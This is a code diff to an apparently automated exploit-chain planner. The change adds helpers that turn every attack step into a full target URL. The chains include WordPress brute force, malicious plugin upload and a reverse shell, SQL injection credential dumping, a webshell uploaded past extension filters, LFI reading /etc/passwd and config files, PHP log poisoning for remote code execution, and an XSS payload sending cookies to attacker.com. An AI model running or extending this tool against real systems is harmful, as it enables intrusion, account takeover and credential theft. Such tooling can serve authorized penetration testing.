@@ -49,6 +49,52 @@ class ChainPlanner:
         self.state = state
         self.learning_engine = learning_engine
 
+    def _get_base_url(self) -> str:
+        """
+        Extract base URL (scheme + domain) from state.
+        Infers https:// by default, http:// for non-standard ports.
+        Returns fully qualified URL with scheme.
+        """
+        # Try live_hosts first (they have full URLs)
+        live_hosts = self.state.get("live_hosts", [])
+        if live_hosts:
+            host_url = live_hosts[0].get("url", "")
+            if host_url:
+                if host_url.startswith(('http://', 'https://')):
+                    return host_url.rstrip('/')
+        
+        # Fall back to target domain
+        target = self.state.get("target", "")
+        if not target:
+            return "https://localhost"
+        
+        # Add scheme if missing
+        if not target.startswith(('http://', 'https://')):
+            # Check for non-standard port → use http://
+            if ':' in target and not target.startswith('['):  # Not IPv6
+                return f"http://{target}"
+            # Default to https
+            return f"https://{target}"
+        
+        return target.rstrip('/')
+
+    def _build_full_url(self, path: str) -> str:
+        """
+        Build full URL from base + path.
+        Handles relative paths, ensures scheme is present.
+        """
+        if not path:
+            return self._get_base_url()
+        
+        # If already has scheme, return as-is
+        if path.startswith(('http://', 'https://')):
+            return path.rstrip('/')
+        
+        # Combine base URL with path
+        base = self._get_base_url()
+        path = path.lstrip('/')
+        return f"{base}/{path}"
+
     def plan_chains_from_graph(self, attack_graph) -> List[ExploitChain]:
         """Plan chains from attack graph analysis"""
         chains = []
@@ -568,7 +614,7 @@ class ChainPlanner:
                 ExploitStep(
                     name="User Enumeration",
                     action="enumerate_wp_users",
-                    target="wp-json/wp/v2/users",
+                    target=self._build_full_url("wp-json/wp/v2/users"),
                     tool="curl",
                     success_indicator="user list extracted",
                     priority=10,
@@ -576,7 +622,7 @@ class ChainPlanner:
                 ExploitStep(
                     name="Password Bruteforce",
                     action="bruteforce_wp_login",
-                    target="wp-login.php",
+                    target=self._build_full_url("wp-login.php"),
                     tool="wpscan/hydra",
                     payload=f"username={primary_user}",
                     depends_on=["User Enumeration"],
@@ -586,7 +632,7 @@ class ChainPlanner:
                 ExploitStep(
                     name="Admin Login",
                     action="login_wp_admin",
-                    target="wp-admin/",
+                    target=self._build_full_url("wp-admin/"),
                     tool="curl/browser",
                     depends_on=["Password Bruteforce"],
                     success_indicator="admin dashboard accessible",
@@ -595,7 +641,7 @@ class ChainPlanner:
                 ExploitStep(
                     name="Plugin Upload",
                     action="upload_malicious_plugin",
-                    target="wp-admin/plugin-install.php",
+                    target=self._build_full_url("wp-admin/plugin-install.php"),
                     tool="curl",
                     payload="malicious_plugin.zip",
                     depends_on=["Admin Login"],
@@ -605,7 +651,7 @@ class ChainPlanner:
                 ExploitStep(
                     name="Reverse Shell",
                     action="trigger_reverse_shell",
-                    target="wp-content/plugins/malicious/shell.php",
+                    target=self._build_full_url("wp-content/plugins/malicious/shell.php"),
                     tool="nc",
                     payload="cmd=id",
                     depends_on=["Plugin Upload"],
@@ -628,7 +674,7 @@ class ChainPlanner:
                 ExploitStep(
                     name="Verify XML-RPC",
                     action="check_xmlrpc",
-                    target="xmlrpc.php",
+                    target=self._build_full_url("xmlrpc.php"),
                     tool="curl",
                     payload="system.listMethods",
                     success_indicator="methodResponse received",
@@ -637,7 +683,7 @@ class ChainPlanner:
                 ExploitStep(
                     name="Multicall Bruteforce",
                     action="xmlrpc_multicall",
-                    target="xmlrpc.php",
+                    target=self._build_full_url("xmlrpc.php"),
                     tool="custom_script",
                     payload="wp.getUsersBlogs multicall",
                     depends_on=["Verify XML-RPC"],
@@ -649,6 +695,10 @@ class ChainPlanner:
 
     def _build_sqli_chain(self, vuln: Dict) -> ExploitChain:
         """SQL injection → data exfil → possible auth bypass"""
+        vuln_url = vuln.get("url", "")
+        if not vuln_url.startswith(('http://', 'https://')):
+            vuln_url = self._build_full_url(vuln_url)
+        
         return ExploitChain(
             name="SQL Injection → Data Exfiltration",
             description="Exploit SQLi to dump credentials and sensitive data",
@@ -661,7 +711,7 @@ class ChainPlanner:
                 ExploitStep(
                     name="Confirm SQLi",
                     action="test_sqli",
-                    target=vuln.get("url", ""),
+                    target=vuln_url,
                     tool="sqlmap",
                     payload="' OR '1'='1",
                     success_indicator="SQL error or boolean difference detected",
@@ -670,7 +720,7 @@ class ChainPlanner:
                 ExploitStep(
                     name="Database Enumeration",
                     action="enumerate_databases",
-                    target=vuln.get("url", ""),
+                    target=vuln_url,
                     tool="sqlmap",
                     payload="--dbs",
                     depends_on=["Confirm SQLi"],
@@ -680,7 +730,7 @@ class ChainPlanner:
                 ExploitStep(
                     name="Dump Credentials",
                     action="dump_users_table",
-                    target=vuln.get("url", ""),
+                    target=vuln_url,
                     tool="sqlmap",
                     payload="--dump -T users",
                     depends_on=["Database Enumeration"],
@@ -690,7 +740,7 @@ class ChainPlanner:
                 ExploitStep(
                     name="Auth Bypass",
                     action="try_extracted_credentials",
-                    target="login page",
+                    target=self._build_full_url("login"),
                     tool="curl",
                     depends_on=["Dump Credentials"],
                     success_indicator="authenticated successfully",
@@ -702,6 +752,10 @@ class ChainPlanner:
 
     def _build_upload_chain(self, endpoint: Dict) -> ExploitChain:
         """File upload → webshell → RCE"""
+        upload_url = endpoint.get("url", "")
+        if not upload_url.startswith(('http://', 'https://')):
+            upload_url = self._build_full_url(upload_url)
+        
         return ExploitChain(
             name="File Upload → Webshell → RCE",
             description="Bypass file upload restrictions to deploy a webshell",
@@ -712,7 +766,7 @@ class ChainPlanner:
                 ExploitStep(
                     name="Test Upload",
                     action="upload_benign_file",
-                    target=endpoint.get("url", ""),
+                    target=upload_url,
                     tool="curl",
                     payload="test.txt",
                     success_indicator="upload successful",
@@ -721,7 +775,7 @@ class ChainPlanner:
                 ExploitStep(
                     name="Bypass Extension Filter",
                     action="upload_php_double_ext",
-                    target=endpoint.get("url", ""),
+                    target=upload_url,
                     tool="curl",
                     payload="shell.php.jpg",
                     depends_on=["Test Upload"],
@@ -731,7 +785,7 @@ class ChainPlanner:
                 ExploitStep(
                     name="Execute Webshell",
                     action="trigger_webshell",
-                    target="uploads/shell.php",
+                    target=self._build_full_url("uploads/shell.php"),
                     tool="curl",
                     payload="?cmd=id",
                     depends_on=["Bypass Extension Filter"],
@@ -743,6 +797,10 @@ class ChainPlanner:
 
     def _build_lfi_chain(self, endpoint: Dict) -> ExploitChain:
         """LFI → log poisoning → RCE"""
+        endpoint_url = endpoint.get("url", "")
+        if not endpoint_url.startswith(('http://', 'https://')):
+            endpoint_url = self._build_full_url(endpoint_url)
+        
         return ExploitChain(
             name="LFI → Log Poisoning → RCE",
             description="Exploit LFI to read sensitive files, then poison logs for RCE",
@@ -753,7 +811,7 @@ class ChainPlanner:
                 ExploitStep(
                     name="Confirm LFI",
                     action="test_lfi",
-                    target=endpoint.get("url", ""),
+                    target=endpoint_url,
                     payload="../../../../etc/passwd",
                     success_indicator="passwd file content in response",
                     priority=10,
@@ -761,7 +819,7 @@ class ChainPlanner:
                 ExploitStep(
                     name="Read Config Files",
                     action="read_config",
-                    target=endpoint.get("url", ""),
+                    target=endpoint_url,
                     payload="../../../../var/www/html/config.php",
                     depends_on=["Confirm LFI"],
                     success_indicator="database credentials found",
@@ -770,7 +828,7 @@ class ChainPlanner:
                 ExploitStep(
                     name="Log Poisoning",
                     action="inject_php_in_logs",
-                    target="User-Agent header",
+                    target=self._get_base_url(),
                     payload="<?php system($_GET['cmd']); ?>",
                     depends_on=["Confirm LFI"],
                     success_indicator="PHP code in logs",
@@ -779,7 +837,7 @@ class ChainPlanner:
                 ExploitStep(
                     name="Execute via LFI",
                     action="include_poisoned_log",
-                    target=endpoint.get("url", ""),
+                    target=endpoint_url,
                     payload="../../../../var/log/apache2/access.log&cmd=id",
                     depends_on=["Log Poisoning"],
                     success_indicator="RCE achieved",
@@ -790,6 +848,12 @@ class ChainPlanner:
 
     def _build_xss_chain(self, vuln: Dict) -> ExploitChain:
         """XSS → session hijack → account takeover"""
+        vuln_url = vuln.get("url", "")
+        if not vuln_url.startswith(('http://', 'https://')):
+            vuln_url = self._build_full_url(vuln_url)
+        
+        admin_url = self._build_full_url("admin")
+        
         return ExploitChain(
             name="XSS → Session Hijack → Account Takeover",
             description="Use stored/reflected XSS to steal admin session cookies",
@@ -800,7 +864,7 @@ class ChainPlanner:
                 ExploitStep(
                     name="Confirm XSS",
                     action="test_xss",
-                    target=vuln.get("url", ""),
+                    target=vuln_url,
                     payload="<script>alert(1)</script>",
                     success_indicator="alert triggered",
                     priority=10,
@@ -808,7 +872,7 @@ class ChainPlanner:
                 ExploitStep(
                     name="Setup Cookie Collector",
                     action="start_listener",
-                    target="attacker server",
+                    target="http://127.0.0.1:8000",
                     tool="nc/python",
                     success_indicator="server listening",
                     priority=9,
@@ -816,7 +880,7 @@ class ChainPlanner:
                 ExploitStep(
                     name="Inject Cookie Stealer",
                     action="inject_cookie_stealer",
-                    target=vuln.get("url", ""),
+                    target=vuln_url,
                     payload="<script>document.location='http://attacker.com/?c='+document.cookie</script>",
                     depends_on=["Setup Cookie Collector"],
                     success_indicator="admin visits page",
@@ -825,7 +889,7 @@ class ChainPlanner:
                 ExploitStep(
                     name="Session Replay",
                     action="use_stolen_session",
-                    target="admin panel",
+                    target=admin_url,
                     tool="browser/curl",
                     depends_on=["Inject Cookie Stealer"],
                     success_indicator="admin access achieved",
@@ -850,14 +914,14 @@ class ChainPlanner:
                 ExploitStep(
                     name="Confirm Plugin Version",
                     action="check_plugin_version",
-                    target=f"wp-content/plugins/{plugin_name}/readme.txt",
+                    target=self._build_full_url(f"wp-content/plugins/{plugin_name}/readme.txt"),
                     success_indicator="vulnerable version confirmed",
                     priority=10,
                 ),
                 ExploitStep(
                     name="Send Exploit Payload",
                     action="exploit_plugin_vuln",
-                    target=f"wp-content/plugins/{plugin_name}/",
+                    target=self._build_full_url(f"wp-content/plugins/{plugin_name}/"),
                     tool="curl/metasploit",
                     payload=f"{vuln_type} payload",
                     depends_on=["Confirm Plugin Version"],
@@ -931,6 +995,14 @@ class ChainPlanner:
         return chains
 
     def _build_upload_admin_chain(self, upload_ep: Dict, admin_ep: Dict) -> ExploitChain:
+        upload_url = upload_ep.get("url", "")
+        if not upload_url.startswith(('http://', 'https://')):
+            upload_url = self._build_full_url(upload_url)
+        
+        admin_url = admin_ep.get("url", "")
+        if not admin_url.startswith(('http://', 'https://')):
+            admin_url = self._build_full_url(admin_url)
+        
         return ExploitChain(
             name="Upload → Admin Access → RCE",
             description="Upload malicious file, gain admin access, execute RCE",
@@ -938,13 +1010,21 @@ class ChainPlanner:
             estimated_time="10-30 min",
             prerequisites=["Upload endpoint", "Admin panel"],
             steps=[
-                ExploitStep(name="Upload Shell", action="upload_webshell", target=upload_ep["url"], tool="curl", payload="shell.php"),
-                ExploitStep(name="Access Admin", action="login_admin", target=admin_ep["url"], tool="curl", depends_on=["Upload Shell"]),
-                ExploitStep(name="Execute RCE", action="trigger_shell", target="uploaded_shell.php", tool="curl", depends_on=["Access Admin"], payload="?cmd=id"),
+                ExploitStep(name="Upload Shell", action="upload_webshell", target=upload_url, tool="curl", payload="shell.php"),
+                ExploitStep(name="Access Admin", action="login_admin", target=admin_url, tool="curl", depends_on=["Upload Shell"]),
+                ExploitStep(name="Execute RCE", action="trigger_shell", target=self._build_full_url("uploaded_shell.php"), tool="curl", depends_on=["Access Admin"], payload="?cmd=id"),
             ]
         )
 
     def _build_auth_bypass_chain(self, vuln: Dict, admin_ep: Dict) -> ExploitChain:
+        vuln_url = vuln.get("url", "")
+        if not vuln_url.startswith(('http://', 'https://')):
+            vuln_url = self._build_full_url(vuln_url)
+        
+        admin_url = admin_ep.get("url", "")
+        if not admin_url.startswith(('http://', 'https://')):
+            admin_url = self._build_full_url(admin_url)
+        
         return ExploitChain(
             name="Auth Bypass → Admin Takeover",
             description="Bypass authentication to access admin panel",
@@ -952,12 +1032,18 @@ class ChainPlanner:
             estimated_time="5-15 min",
             prerequisites=["Auth vulnerability", "Admin endpoint"],
             steps=[
-                ExploitStep(name="Bypass Auth", action="exploit_auth_bypass", target=vuln["url"], tool="curl"),
-                ExploitStep(name="Access Admin", action="enter_admin", target=admin_ep["url"], tool="curl", depends_on=["Bypass Auth"]),
+                ExploitStep(name="Bypass Auth", action="exploit_auth_bypass", target=vuln_url, tool="curl"),
+                ExploitStep(name="Access Admin", action="enter_admin", target=admin_url, tool="curl", depends_on=["Bypass Auth"]),
             ]
         )
 
     def _build_lfi_log_poison_chain(self, vuln: Dict) -> ExploitChain:
+        vuln_url = vuln.get("url", "")
+        if not vuln_url.startswith(('http://', 'https://')):
+            vuln_url = self._build_full_url(vuln_url)
+        
+        target_base = self._get_base_url()
+        
         return ExploitChain(
             name="LFI → Log Poisoning → RCE",
             description="Use LFI to read logs, poison logs for RCE",
@@ -965,9 +1051,9 @@ class ChainPlanner:
             estimated_time="15-45 min",
             prerequisites=["LFI vulnerability"],
             steps=[
-                ExploitStep(name="Read Logs", action="read_log_file", target=vuln["url"], tool="curl", payload="../../../../var/log/apache2/access.log"),
-                ExploitStep(name="Poison Log", action="inject_log", target="target.com", tool="curl", payload="<?php system($_GET['cmd']); ?>"),
-                ExploitStep(name="Execute RCE", action="trigger_rce", target=vuln["url"], tool="curl", depends_on=["Poison Log"], payload="?file=../../../var/log/apache2/access.log&cmd=id"),
+                ExploitStep(name="Read Logs", action="read_log_file", target=vuln_url, tool="curl", payload="../../../../var/log/apache2/access.log"),
+                ExploitStep(name="Poison Log", action="inject_log", target=target_base, tool="curl", payload="<?php system($_GET['cmd']); ?>"),
+                ExploitStep(name="Execute RCE", action="trigger_rce", target=vuln_url, tool="curl", depends_on=["Poison Log"], payload="?file=../../../var/log/apache2/access.log&cmd=id"),
             ]
         )
 
